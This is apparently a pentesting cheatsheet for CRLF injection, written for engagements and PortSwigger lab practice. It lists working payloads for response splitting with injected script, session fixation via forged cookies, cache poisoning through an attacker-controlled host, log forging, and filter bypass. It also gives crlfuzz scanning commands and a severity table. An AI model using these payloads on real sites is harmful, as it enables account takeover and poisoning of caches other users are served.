# 08 — CRLF Injection Cheatsheet

Quick-reference companion to files `01`–`07`. Every payload here is
explained in full in its source file — this file is for fast lookup during
an engagement, not for learning the mechanism for the first time.

## Core encoding reference

| Character | Hex | Decimal | URL-encoded |
|---|---|---|---|
| Carriage Return (CR) | `0x0D` | 13 | `%0d` |
| Line Feed (LF) | `0x0A` | 10 | `%0a` |
| CRLF pair | `0x0D0A` | — | `%0d%0a` |
| `%` (for double encoding) | `0x25` | 37 | `%25` |

## Baseline detection payload

```
%0d%0aX-Injected-Header:%20test
```
Confirms: does this sink let you terminate a header and add a new one?
Check the raw response for a literal `X-Injected-Header: test` line.

## Response splitting → header injection (file 02)

```
/redirect?url=/home%0d%0aSet-Cookie:%20admin=true
```

## Response splitting → forged second response (file 02)

```
/redirect?url=/home%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```

## Cache poisoning — unkeyed header (file 03, Tier A)

```
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker-controlled.exploit-server.net
```
Test for unkeyed input first with Burp's Param Miner ("Guess headers" /
"Guess GET parameters" / "Guess cookies").

## CRLF via HTTP/2 downgrade (file 03, Tier B)

Inject via Burp Inspector (Shift+Return inside a header value field), not
URL encoding:
```
foo: bar\r\nTransfer-Encoding: chunked
```

## Session fixation via forged Set-Cookie (file 04)

```
/profile?lang=en%0d%0aSet-Cookie:%20session=ATTACKER-KNOWN-VALUE;%20Path=/%0d%0a%0d%0a
```

## Log injection — forged log line (file 05)

```
admin%0d%0a2026-06-26 10:15:02 INFO  Successful login for user: admin from 10.0.0.1
```

## WAF / filter bypass quick list (file 06)

| Technique | Payload | Works when... |
|---|---|---|
| Case manipulation | `%0D%0A`, `%0d%0A` | Filter regex is case-sensitive |
| Double encoding | `%250d%250a` | Pipeline decodes the value twice |
| Overlong/malformed UTF-8 | `%E5%98%8A%E5%98%8D` | Decoder normalizes invalid UTF-8 leniently |
| Bare LF only | `%0a` | Filter only matches the `%0d%0a` pair |
| Bare CR only | `%0d` | Same as above |
| Byte inserted mid-sequence | `%0d%00%0a` | Filter matches an unbroken literal string |
| HTTP/2 raw header injection | `\r\n` inside header value (Inspector) | Front end is HTTP/2 and downgrades to HTTP/1.1 |

## crlfuzz quick commands (file 07)

```bash
# Single target
crlfuzz -u "https://target.example.com"

# Recon pipeline
subfinder -d target.com -silent | httpx -silent | crlfuzz -s -o crlf-hits.txt

# Authenticated
crlfuzz -u "https://target.example.com/redirect" -H "Cookie: session=TOKEN"

# Through Burp
crlfuzz -u "https://target.example.com" -x http://127.0.0.1:8080

# List input
crlfuzz -l urls.txt -c 40 -o results.txt
```

## PortSwigger Web Security Academy lab mapping (Academy order)

> PortSwigger has no standalone "CRLF Injection" topic. Mapped below from
> the two real topics where the mechanism actually appears. See file `03`
> for the full reasoning and tier breakdown.

| Order | Lab | Topic | Tier |
|---|---|---|---|
| 1 | Web cache poisoning with an unkeyed header | Web cache poisoning | Apprentice |
| 2 | Web cache poisoning with an unkeyed cookie | Web cache poisoning | Apprentice |
| 3 | Web cache poisoning with multiple headers | Web cache poisoning | Practitioner |
| 4 | Web cache poisoning via an unkeyed header leading to DOM-based XSS | Web cache poisoning | Practitioner |
| 5 | Web cache poisoning with an unkeyed cookie and a non-standard cache rule | Web cache poisoning | Practitioner |
| 6 | Combining web cache poisoning vulnerabilities | Web cache poisoning | Expert |
| 7 | Web cache poisoning via an unkeyed query string | Web cache poisoning | Practitioner |
| 8 | Web cache poisoning via a fat GET request | Web cache poisoning | Practitioner |
| 9 | Web cache poisoning via an unkeyed query parameter | Web cache poisoning | Practitioner |
| 10 | Web cache poisoning via a cache key injection (parameter cloaking) | Web cache poisoning | Expert |
| 11 | Web cache poisoning via an unkeyed port | Web cache poisoning | Practitioner |
| 12 | HTTP/2 request smuggling via CRLF injection | HTTP request smuggling → Advanced | Expert |
| 13 | HTTP/2 request splitting via CRLF injection | HTTP request smuggling → Advanced | Expert |

Labs 12–13 require completing the foundational HTTP Request Smuggling
labs (CL.TE/TE.CL desync basics) first — they're outside this series'
scope but are a prerequisite for understanding the downgrade mechanism.

Labs 1–11 may be reordered or added to by PortSwigger over time — verify
against the live topic page before an exam or structured practice session.

## No-lab techniques (real-world methodology, not Academy-mapped)

| Technique | File | Why no lab exists |
|---|---|---|
| Classic single-request HTTP response splitting | `02` | Modern framework header APIs filter raw CRLF by default |
| Session fixation via forged Set-Cookie | `04` | Same root cause as above; doesn't reproduce cleanly as a lab |
| Log injection / log forging | `05` | Server-side logging concern, not a client-observable lab outcome |

## Severity quick-reference

| Finding | Typical severity | Drivers |
|---|---|---|
| Bare CRLF injection, no chain | Low–Medium | CWE-93, impact depends entirely on sink |
| → chained into cache poisoning | High–Critical | Affects all visitors, not just the attacker |
| → chained into session fixation | Critical | Direct account takeover path |
| → chained into request smuggling | Critical | Cross-user data exposure on shared infra |
| Log injection alone | Low–Medium | Integrity/SIEM-evasion impact, rarely externally provable |
